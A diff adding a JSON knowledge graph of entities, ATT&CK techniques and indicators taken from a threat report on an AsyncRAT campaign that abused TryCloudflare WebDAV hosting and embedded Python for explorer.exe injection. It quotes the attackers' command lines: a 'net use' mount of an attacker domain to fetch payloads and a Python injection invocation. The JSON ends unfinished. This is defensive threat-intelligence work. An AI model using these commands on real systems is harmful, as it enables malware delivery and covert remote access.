@@ -1,0 +1,1424 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_153928bf9609",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "PowerShell",
+        "sentence_indices": [
+          4,
+          26,
+          28,
+          30,
+          53
+        ],
+        "span_sentences": [
+          "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection.",
+          "The Vio.bat file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip.",
+          "This batch file (xeno.bat) invokes PowerShell to download a ZIP file from the internet and save it to the user's temporary folder.",
+          "The archive p.zip was then extracted using the PowerShell command Expand-Archive to C:\\Users\\<USERNAME>\\AppData\\Local\\z1man.",
+          "The attackers’ use of living-off-the-land techniques, including the use of Windows Script Host and PowerShell, further complicates detection and response efforts."
+        ],
+        "edges": [
+          "EDGE_1bcf824222e5",
+          "EDGE_40422d3334f9"
+        ]
+      },
+      {
+        "node_id": "HL_548f85d138f6",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Cloudflare",
+        "sentence_indices": [
+          0,
+          1,
+          8,
+          9,
+          17,
+          51
+        ],
+        "span_sentences": [
+          "Threat actors exploited Cloudflare's free-tier infrastructure and legitimate Python environments to deploy the AsyncRAT remote access trojan, demonstrating advanced evasion techniques that abuse trusted cloud services for malicious operations.",
+          "Overview\n- AsyncRAT-connected threat actors are exploiting Cloudflare's free-tier services and TryCloudflare tunneling domains to host their WebDAV servers, masking malicious activities under trusted infrastructure and making detections challenging for traditional security solutions while ensuring reliable payload delivery.",
+          "The attackers cleverly exploited Cloudflare's free-tier services to host their WebDAV server, abusing the platform's reliability and widespread trust to evade detection.",
+          "By using Cloudflare's infrastructure, the threat actors masked the malicious activity under legitimate domains, making it challenging for traditional security solutions to identify and block the threat.",
+          "The downloaded ZIP file contains the Rechnung-zu-Auftrag-W19248960825.pdf.url Internet Shortcut file, which links to a WebDAV resource hosted on various servers within Cloudflare's free-tier service with URLs containing trycloudflare[.]com in their names.",
+          "By utilizing Python-based scripts and abusing Cloudflare’s free-tier infrastructure for hosting malicious payloads, the attackers successfully masked their activities under trusted domains, bypassing traditional security controls."
+        ],
+        "edges": [
+          "EDGE_48412b2bbc22"
+        ]
+      },
+      {
+        "node_id": "HL_6a0a95cd84d0",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Dropbox",
+        "sentence_indices": [
+          3,
+          11
+        ],
+        "span_sentences": [
+          "- The campaign begins with phishing emails distributed via Dropbox links, using double-extension files (.pdf.url) to deceive victims, and displaying legitimate PDF documents during execution to reduce suspicion.",
+          "During the initial stages of the attack, users received a phishing email containing a Dropbox link leading to an Internet Shortcut file(.url)."
+        ],
+        "edges": [
+          "EDGE_0097d63541aa"
+        ]
+      },
+      {
+        "node_id": "HL_955c7439f454",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Donut",
+        "sentence_indices": [
+          45
+        ],
+        "span_sentences": [
+          "When unpacked, these new.bin files were identified to be shellcode files created using Donut, an open-source framework used to generate position-independent shellcode."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_973c7ab7d44a",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "TryCloudflare",
+        "sentence_indices": [
+          1,
+          12
+        ],
+        "span_sentences": [
+          "Overview\n- AsyncRAT-connected threat actors are exploiting Cloudflare's free-tier services and TryCloudflare tunneling domains to host their WebDAV servers, masking malicious activities under trusted infrastructure and making detections challenging for traditional security solutions while ensuring reliable payload delivery.",
+          "When opened, the file redirects users to download multi-stage scripts hosted on TryCloudflare domains."
+        ],
+        "edges": [
+          "EDGE_07ed8643100d"
+        ]
+      },
+      {
+        "node_id": "HL_a4578f2623b0",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "AsyncRAT",
+        "sentence_indices": [
+          0,
+          5,
+          10,
+          33,
+          38,
+          46,
+          49,
+          50
+        ],
+        "span_sentences": [
+          "Threat actors exploited Cloudflare's free-tier infrastructure and legitimate Python environments to deploy the AsyncRAT remote access trojan, demonstrating advanced evasion techniques that abuse trusted cloud services for malicious operations.",
+          "Introduction\nAsyncRAT has emerged as a notable Remote Access Trojan (RAT) used by threat actors for its robust capabilities and ease of deployment.",
+          "This entry dissects the attack chain from initial compromise through AsyncRAT deployment, examining the attacker's techniques for system infiltration and persistent access.",
+          "Analysis revealed that new.bin contains shellcode, which we identified as AsyncRAT.",
+          "We successfully extracted all files from one of the active remote servers at 87[.]106[.]191[.]217:5380, which revealed the complete set of files used to install AsyncRAT.",
+          "- Folders ab, ow, and vb contain different sets of new.bin, a.txt, and ne.py files, consisting of different sets of backdoor payloads alongside AsyncRAT.",
+          "Both URLs also retrieve a legitimate PDF file from the website ihk[.]de and host the final payload, which performs code injection into explorer.exe using Python, and ultimately loads the AsyncRAT shell.",
+          "The AsyncRAT campaign analyzed in this report demonstrates the increasing sophistication of threat actors in abusing legitimate services and open-source tools to evade detection and establish persistent remote access."
+        ],
+        "edges": [
+          "EDGE_1a3ca7c48329",
+          "EDGE_562234411600",
+          "EDGE_74a2756eec86",
+          "EDGE_956a657ba8dc",
+          "EDGE_95c6fdf6531e",
+          "EDGE_9f1fec8e3945",
+          "EDGE_bea7e07df8f9",
+          "EDGE_ced084c84501",
+          "EDGE_ec94a16e0ef2",
+          "EDGE_f44ec0ba4995"
+        ]
+      },
+      {
+        "node_id": "HL_df8c460afb62",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Trend Vision One™",
+        "sentence_indices": [
+          39
+        ],
+        "span_sentences": [
+          "The remote server contained all the files that we observed using Trend Vision One™."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_eb6a7b174a27",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Python 3.14.0",
+        "sentence_indices": [
+          26,
+          29
+        ],
+        "span_sentences": [
+          "The Vio.bat file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip.",
+          "The downloaded file, in this specific case, is an embedded version of Python 3.14.0 for 64-bit Windows systems, which is saved as p.zip."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_eb8915b8d64e",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Windows Script Host",
+        "sentence_indices": [
+          4,
+          7,
+          53
+        ],
+        "span_sentences": [
+          "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection.",
+          "The initial payload, a Windows Script Host (WSH) file, was designed to download and execute additional malicious scripts hosted on a WebDAV server.",
+          "The attackers’ use of living-off-the-land techniques, including the use of Windows Script Host and PowerShell, further complicates detection and response efforts."
+        ],
+        "edges": [
+          "EDGE_4f7ab8ae5ceb",
+          "EDGE_c194b4a41891"
+        ]
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1027",
+        "ttp_id": "T1027",
+        "best_span_sentences_list": [
+          [
+            "The a.txt file contains keys used by ne.py to decrypt the obfuscated input binary file new.bin."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            43,
+            43
+          ]
+        ],
+        "edges": [
+          "EDGE_6188e7c53930",
+          "EDGE_ec94a16e0ef2"
+        ]
+      },
+      {
+        "node_id": "TTP_T1036",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1036",
+        "ttp_id": "T1036",
+        "best_span_sentences_list": [
+          [
+            "- The campaign begins with phishing emails distributed via Dropbox links, using double-extension files (.pdf.url) to deceive victims, and displaying legitimate PDF documents during execution to reduce suspicion."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            3,
+            3
+          ]
+        ],
+        "edges": [
+          "EDGE_744a5eba4fe2",
+          "EDGE_f44ec0ba4995"
+        ]
+      },
+      {
+        "node_id": "TTP_T1055",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1055",
+        "ttp_id": "T1055",
+        "best_span_sentences_list": [
+          [
+            "- The attack uses legitimate Python downloads from official sources, establishing a complete Python environment on victim systems to execute sophisticated code injection techniques targeting explorer.exe processes."
+          ],
+          [
+            "We observed python.exe being used to perform code injection into explorer.exe via the command python ne.py new.bin -k a.txt."
+          ],
+          [
+            "The ne.py Python script is used for Polymorphic Asynchronous Procedure Call (APC) Injection, which is a method of executing arbitrary code in the address space of a separate live process."
+          ],
+          [
+            "- The binary file new.bin serves as the primary input to ne.py, containing the main binary payload that is decrypted and injected into the target process (default: explorer.exe) via APC injection."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ],
+          [
+            32,
+            32
+          ],
+          [
+            40,
+            40
+          ],
+          [
+            44,
+            44
+          ]
+        ],
+        "edges": [
+          "EDGE_0abbb7368fde",
+          "EDGE_562234411600",
+          "EDGE_9b612a613039",
+          "EDGE_d0181937f7e8",
+          "EDGE_f8ce0dd09a34"
+        ]
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1059",
+        "ttp_id": "T1059",
+        "best_span_sentences_list": [
+          [
+            "- The attack uses legitimate Python downloads from official sources, establishing a complete Python environment on victim systems to execute sophisticated code injection techniques targeting explorer.exe processes."
+          ],
+          [
+            "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection."
+          ],
+          [
+            "The initial payload, a Windows Script Host (WSH) file, was designed to download and execute additional malicious scripts hosted on a WebDAV server."
+          ],
+          [
+            "The Vio.bat file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip.",
+            "processFilePath: C:\\Windows\\System32\\cmd.exe\nprocessCmd: C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\vio.bat\" h \"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nobjectCmd: powershell -Command \"iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\p.zip'\"\nThe other downloaded batch file (xeno.bat) has near-identical functions to vio.bat.",
+            "This batch file (xeno.bat) invokes PowerShell to download a ZIP file from the internet and save it to the user's temporary folder."
+          ],
+          [
+            "The archive p.zip was then extracted using the PowerShell command Expand-Archive to C:\\Users\\<USERNAME>\\AppData\\Local\\z1man."
+          ],
+          [
+            "We observed python.exe being used to perform code injection into explorer.exe via the command python ne.py new.bin -k a.txt."
+          ],
+          [
+            "The ne.py Python script is used for Polymorphic Asynchronous Procedure Call (APC) Injection, which is a method of executing arbitrary code in the address space of a separate live process."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ],
+          [
+            4,
+            4
+          ],
+          [
+            7,
+            7
+          ],
+          [
+            26,
+            28
+          ],
+          [
+            30,
+            30
+          ],
+          [
+            32,
+            32
+          ],
+          [
+            40,
+            40
+          ]
+        ],
+        "edges": [
+          "EDGE_04ef99d90e9a",
+          "EDGE_105002f3e531",
+          "EDGE_1330cf3c1d72",
+          "EDGE_1bcf824222e5",
+          "EDGE_2bc527a5e896",
+          "EDGE_3f5468d8ac7c",
+          "EDGE_6b9e41313542",
+          "EDGE_74a2756eec86",
+          "EDGE_82df7e2b6e6f",
+          "EDGE_a7fbe2bdf092",
+          "EDGE_c194b4a41891",
+          "EDGE_e63de98c7edf",
+          "EDGE_f9586280275b"
+        ]
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1071",
+        "ttp_id": "T1071",
+        "best_span_sentences_list": [
+          [
+            "Overview\n- AsyncRAT-connected threat actors are exploiting Cloudflare's free-tier services and TryCloudflare tunneling domains to host their WebDAV servers, masking malicious activities under trusted infrastructure and making detections challenging for traditional security solutions while ensuring reliable payload delivery."
+          ],
+          [
+            "Next, the svchost.exe process initiates the WebClient service to enable interaction with WebDAV servers.",
+            "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ],
+          [
+            20,
+            21
+          ]
+        ],
+        "edges": [
+          "EDGE_8ec1448c1e16",
+          "EDGE_a63c539c46dd",
+          "EDGE_e02c33d1db18"
+        ]
+      },
+      {
+        "node_id": "TTP_T1102",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1102",
+        "ttp_id": "T1102",
+        "best_span_sentences_list": [
+          [
+            "Overview\n- AsyncRAT-connected threat actors are exploiting Cloudflare's free-tier services and TryCloudflare tunneling domains to host their WebDAV servers, masking malicious activities under trusted infrastructure and making detections challenging for traditional security solutions while ensuring reliable payload delivery."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ]
+        ],
+        "edges": [
+          "EDGE_07ed8643100d",
+          "EDGE_1a3ca7c48329",
+          "EDGE_413a10566f8a",
+          "EDGE_48412b2bbc22"
+        ]
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1105",
+        "ttp_id": "T1105",
+        "best_span_sentences_list": [
+          [
+            "The initial payload, a Windows Script Host (WSH) file, was designed to download and execute additional malicious scripts hosted on a WebDAV server."
+          ],
+          [
+            "When opened, the file redirects users to download multi-stage scripts hosted on TryCloudflare domains."
+          ],
+          [
+            "The Vio.bat file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip.",
+            "processFilePath: C:\\Windows\\System32\\cmd.exe\nprocessCmd: C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\vio.bat\" h \"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nobjectCmd: powershell -Command \"iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\p.zip'\"\nThe other downloaded batch file (xeno.bat) has near-identical functions to vio.bat.",
+            "This batch file (xeno.bat) invokes PowerShell to download a ZIP file from the internet and save it to the user's temporary folder."
+          ],
+          [
+            "Note that in some cases, Python was not downloaded from the official website, instead, the net use command was used to mount the WebDAV server where the Python library was hosted."
+          ],
+          [
+            "objectCmd: net use Q: \"\\\\syracuse-seeks-wilson-row.trycloudflare[.]com@SSL\\of\" /persistent:no\nThe Python library was then extracted from the mounted Q drive to C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            7,
+            7
+          ],
+          [
+            12,
+            12
+          ],
+          [
+            26,
+            28
+          ],
+          [
+            34,
+            34
+          ],
+          [
+            36,
+            36
+          ]
+        ],
+        "edges": [
+          "EDGE_0f781793f078",
+          "EDGE_1bd523346af0",
+          "EDGE_25afff398873",
+          "EDGE_3a2f84373dd1",
+          "EDGE_3ab01422dab0",
+          "EDGE_40422d3334f9",
+          "EDGE_4c19d9b1bb52",
+          "EDGE_4f7ab8ae5ceb",
+          "EDGE_7adb15690831",
+          "EDGE_b501fc3fdfbb",
+          "EDGE_bdfed18f9ed1",
+          "EDGE_c0ffb155a3e0",
+          "EDGE_ced084c84501",
+          "EDGE_fa6d1c0da8b5"
+        ]
+      },
+      {
+        "node_id": "TTP_T1140",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1140",
+        "ttp_id": "T1140",
+        "best_span_sentences_list": [
+          [
+            "The a.txt file contains keys used by ne.py to decrypt the obfuscated input binary file new.bin."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            43,
+            43
+          ]
+        ],
+        "edges": [
+          "EDGE_95c6fdf6531e",
+          "EDGE_ccb69d26b808"
+        ]
+      },
+      {
+        "node_id": "TTP_T1204",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1204",
+        "ttp_id": "T1204",
+        "best_span_sentences_list": [
+          [
+            "- The campaign begins with phishing emails distributed via Dropbox links, using double-extension files (.pdf.url) to deceive victims, and displaying legitimate PDF documents during execution to reduce suspicion."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            3,
+            3
+          ]
+        ],
+        "edges": [
+          "EDGE_9f1fec8e3945",
+          "EDGE_b56c1dd0af73"
+        ]
+      },
+      {
+        "node_id": "TTP_T1218",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1218",
+        "ttp_id": "T1218",
+        "best_span_sentences_list": [
+          [
+            "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            21,
+            21
+          ]
+        ],
+        "edges": [
+          "EDGE_b6ff033bc844",
+          "EDGE_c5048fe8088d"
+        ]
+      },
+      {
+        "node_id": "TTP_T1547",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1547",
+        "ttp_id": "T1547",
+        "best_span_sentences_list": [
+          [
+            "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            4,
+            4
+          ]
+        ],
+        "edges": [
+          "EDGE_3575e0f1a1a2",
+          "EDGE_956a657ba8dc",
+          "EDGE_ece64d5bd66a"
+        ]
+      },
+      {
+        "node_id": "TTP_T1566",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1566",
+        "ttp_id": "T1566",
+        "best_span_sentences_list": [
+          [
+            "- The campaign begins with phishing emails distributed via Dropbox links, using double-extension files (.pdf.url) to deceive victims, and displaying legitimate PDF documents during execution to reduce suspicion."
+          ],
+          [
+            "During the initial stages of the attack, users received a phishing email containing a Dropbox link leading to an Internet Shortcut file(.url)."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            3,
+            3
+          ],
+          [
+            11,
+            11
+          ]
+        ],
+        "edges": [
+          "EDGE_0097d63541aa",
+          "EDGE_ba0ac9566e93",
+          "EDGE_bea7e07df8f9"
+        ]
+      },
+      {
+        "node_id": "TTP_T1569",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1569",
+        "ttp_id": "T1569",
+        "best_span_sentences_list": [
+          [
+            "Next, the svchost.exe process initiates the WebClient service to enable interaction with WebDAV servers."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            20,
+            20
+          ]
+        ],
+        "edges": [
+          "EDGE_1612a7a15b1d"
+        ]
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_02788cbf0e0a",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "davclnt.dll",
+        "sentence_indices": [
+          21
+        ],
+        "span_sentences": [
+          "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+        ],
+        "edges": [
+          "EDGE_b6ff033bc844"
+        ]
+      },
+      {
+        "node_id": "IOC_04c1b2d0ccbf",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "xeno.bat",
+        "sentence_indices": [
+          28
+        ],
+        "span_sentences": [
+          "This batch file (xeno.bat) invokes PowerShell to download a ZIP file from the internet and save it to the user's temporary folder."
+        ],
+        "edges": [
+          "EDGE_25afff398873",
+          "EDGE_e63de98c7edf"
+        ]
+      },
+      {
+        "node_id": "IOC_1120f7426016",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip",
+        "sentence_indices": [
+          27
+        ],
+        "span_sentences": [
+          "processFilePath: C:\\Windows\\System32\\cmd.exe\nprocessCmd: C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\vio.bat\" h \"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nobjectCmd: powershell -Command \"iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\p.zip'\"\nThe other downloaded batch file (xeno.bat) has near-identical functions to vio.bat."
+        ],
+        "edges": [
+          "EDGE_1bd523346af0"
+        ]
+      },
+      {
+        "node_id": "IOC_11c69003e100",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "python.exe",
+        "sentence_indices": [
+          32
+        ],
+        "span_sentences": [
+          "We observed python.exe being used to perform code injection into explorer.exe via the command python ne.py new.bin -k a.txt."
+        ],
+        "edges": [
+          "EDGE_1330cf3c1d72",
+          "EDGE_9b612a613039"
+        ]
+      },
+      {
+        "node_id": "IOC_17f398714025",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "syracuse-seeks-wilson-row.trycloudflare[.]com",
+        "sentence_indices": [
+          36
+        ],
+        "span_sentences": [
+          "objectCmd: net use Q: \"\\\\syracuse-seeks-wilson-row.trycloudflare[.]com@SSL\\of\" /persistent:no\nThe Python library was then extracted from the mounted Q drive to C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25."
+        ],
+        "edges": [
+          "EDGE_4c19d9b1bb52"
+        ]
+      },
+      {
+        "node_id": "IOC_1e1b68e55755",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "vio.bat",
+        "sentence_indices": [
+          26
+        ],
+        "span_sentences": [
+          "The Vio.bat file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip."
+        ],
+        "edges": [
+          "EDGE_2bc527a5e896",
+          "EDGE_7adb15690831"
+        ]
+      },
+      {
+        "node_id": "IOC_2eabd5a10bef",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Windows\\System32\\cmd.exe",
+        "sentence_indices": [
+          27
+        ],
+        "span_sentences": [
+          "processFilePath: C:\\Windows\\System32\\cmd.exe\nprocessCmd: C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\vio.bat\" h \"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nobjectCmd: powershell -Command \"iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\p.zip'\"\nThe other downloaded batch file (xeno.bat) has near-identical functions to vio.bat."
+        ],
+        "edges": [
+          "EDGE_3f5468d8ac7c"
+        ]
+      },
+      {
+        "node_id": "IOC_452e90101f57",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "rundll32.exe",
+        "sentence_indices": [
+          21
+        ],
+        "span_sentences": [
+          "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+        ],
+        "edges": [
+          "EDGE_c5048fe8088d"
+        ]
+      },
+      {
+        "node_id": "IOC_488d49251394",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\<USERNAME>\\AppData\\Local\\z1man",
+        "sentence_indices": [
+          30
+        ],
+        "span_sentences": [
+          "The archive p.zip was then extracted using the PowerShell command Expand-Archive to C:\\Users\\<USERNAME>\\AppData\\Local\\z1man."
+        ],
+        "edges": [
+          "EDGE_82df7e2b6e6f"
+        ]
+      },
+      {
+        "node_id": "IOC_4d91df6aefa1",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "anc.wsf",
+        "sentence_indices": [
+          25
+        ],
+        "span_sentences": [
+          "In most of the cases that we investigated, the first file that was downloaded and executed was as.wsh which, in turn, downloads and executes anc.wsf."
+        ],
+        "edges": [
+          "EDGE_0f781793f078",
+          "EDGE_105002f3e531"
+        ]
+      },
+      {
+        "node_id": "IOC_4f278b2e1cff",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "plus-condos-thy-redeem.trycloudflare[.]com",
+        "sentence_indices": [
+          21
+        ],
+        "span_sentences": [
+          "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+        ],
+        "edges": [
+          "EDGE_3ab01422dab0",
+          "EDGE_a63c539c46dd"
+        ]
+      },
+      {
+        "node_id": "IOC_5456579a7fc2",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "ne.py",
+        "sentence_indices": [
+          32,
+          40,
+          46
+        ],
+        "span_sentences": [
+          "We observed python.exe being used to perform code injection into explorer.exe via the command python ne.py new.bin -k a.txt.",
+          "The ne.py Python script is used for Polymorphic Asynchronous Procedure Call (APC) Injection, which is a method of executing arbitrary code in the address space of a separate live process.",
+          "- Folders ab, ow, and vb contain different sets of new.bin, a.txt, and ne.py files, consisting of different sets of backdoor payloads alongside AsyncRAT."
+        ],
+        "edges": [
+          "EDGE_a7fbe2bdf092",
+          "EDGE_d0181937f7e8"
+        ]
+      },
+      {
+        "node_id": "IOC_5fc841d9a55f",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "Rechnung-zu-Auftrag-W19248960825.pdf.url",
+        "sentence_indices": [
+          17
+        ],
+        "span_sentences": [
+          "The downloaded ZIP file contains the Rechnung-zu-Auftrag-W19248960825.pdf.url Internet Shortcut file, which links to a WebDAV resource hosted on various servers within Cloudflare's free-tier service with URLs containing trycloudflare[.]com in their names."
+        ],
+        "edges": [
+          "EDGE_744a5eba4fe2",
+          "EDGE_b56c1dd0af73"
+        ]
+      },
+      {
+        "node_id": "IOC_6b8aa8986298",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "Outlook.exe",
+        "sentence_indices": [
+          15
+        ],
+        "span_sentences": [
+          "The image below shows the presence of Outlook.exe, suggesting that the attack involved directing the user to download a malicious archive file named Rechnung zu Auftrag W19248960825.pdf.zip (translating to “Invoice for Order” in German)."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "IOC_9012013632e5",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "ihk[.]de",
+        "sentence_indices": [
+          49
+        ],
+        "span_sentences": [
+          "Both URLs also retrieve a legitimate PDF file from the website ihk[.]de and host the final payload, which performs code injection into explorer.exe using Python, and ultimately loads the AsyncRAT shell."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "IOC_9cfa8346a4be",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25",
+        "sentence_indices": [
+          36
+        ],
+        "span_sentences": [
+          "objectCmd: net use Q: \"\\\\syracuse-seeks-wilson-row.trycloudflare[.]com@SSL\\of\" /persistent:no\nThe Python library was then extracted from the mounted Q drive to C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25."
+        ],
+        "edges": [
+          "EDGE_fa6d1c0da8b5"
+        ]
+      },
+      {
+        "node_id": "IOC_9d757866d1e5",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip",
+        "sentence_indices": [
+          26,
+          27
+        ],
+        "span_sentences": [
+          "The Vio.bat file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip.",
+          "processFilePath: C:\\Windows\\System32\\cmd.exe\nprocessCmd: C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\vio.bat\" h \"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nobjectCmd: powershell -Command \"iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\p.zip'\"\nThe other downloaded batch file (xeno.bat) has near-identical functions to vio.bat."
+        ],
+        "edges": [
+          "EDGE_b501fc3fdfbb",
+          "EDGE_f9586280275b"
+        ]
+      },
+      {
